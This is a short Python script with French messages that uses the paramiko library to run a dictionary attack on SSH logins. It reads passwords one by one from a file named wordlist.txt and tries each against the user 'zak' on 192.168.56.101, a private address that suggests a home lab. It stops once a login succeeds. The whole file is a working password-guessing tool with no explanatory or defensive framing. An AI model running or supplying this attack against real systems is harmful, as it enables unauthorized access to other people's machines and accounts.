import paramiko

def test_connexion(ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=password, timeout=3)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Erreur : {e}")
        return False

ip="192.168.56.101"
user="zak"

with open("wordlist.txt","r") as fichier:
    for ligne in fichier:
        password=ligne.strip()
        print(f"Test du mot de passe: {password}")
        resultat=test_connexion(ip,user,password)
        if resultat:
            print(f"Mot de passe trouver: {password}")
            break
